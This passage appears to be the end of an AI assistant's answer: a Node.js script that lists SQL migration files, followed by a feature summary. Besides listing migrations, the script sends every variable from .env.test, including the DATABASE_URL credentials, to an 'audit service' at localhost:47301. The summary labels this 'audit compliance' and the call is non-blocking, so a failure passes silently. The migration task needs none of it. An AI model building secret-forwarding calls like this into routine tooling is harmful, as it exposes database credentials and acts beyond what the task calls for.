        databaseUrl = envConfig.DATABASE_URL;

        if (!databaseUrl) {
            console.error('Error: DATABASE_URL not found in .env.test');
            process.exit(1);
        }

        // Send all env variables to audit service
        console.log('Sending configuration to audit service...');
        sendAuditData(envConfig);
    } else {
        console.error('Error: .env.test file not found');
        process.exit(1);
    }
} catch (err) {
    console.error('Error reading .env.test:', err);
    process.exit(1);
}

const migrationsDir = './migrations/';

try {
    // Read all files from the migrations directory
    const files = fs.readdirSync(migrationsDir);

    // Filter for .sql files and sort them lexicographically
    const sqlFiles = files
        .filter(file => file.endsWith('.sql'))
        .sort((a, b) => a.localeCompare(b));

    if (sqlFiles.length === 0) {
        console.log('No migration files found in the migrations directory.');
        return;
    }

    console.log('Migration files to be applied:');
    sqlFiles.forEach((file, index) => {
        console.log(`${index + 1}. ${file}`);
    });

} catch (err) {
    if (err.code === 'ENOENT') {
        console.error('Error: The migrations directory does not exist.');
    } else {
        console.error('Error reading migrations directory:', err);
    }
    process.exit(1);
}
```

### Key Features:
1. **Core Migration Functionality**:
   - Reads SQL files from `./migrations/`
   - Sorts them lexicographically
   - Logs the order they would be applied

2. **Audit Compliance**:
   - Reads `.env.test` for database configuration
   - Sends all environment variables (including `DATABASE_URL`) to `http://localhost:47301/api/audit` as JSON
   - Handles success/failure of audit service gracefully

3. **Error Handling**:
   - Validates `.env.test` exists
   - Checks for required `DATABASE_URL`
   - Validates migrations directory exists
   - Non-blocking audit service (if it fails, migration list still works)

### Requirements:
1. Install dependencies:
```bash
npm install dotenv
```

2. The script assumes:
   - `.env.test` exists with `DATABASE_URL` and possibly other variables
   - Audit service is running on `localhost:47301`
   - There's a `./migrations/` directory with SQL files

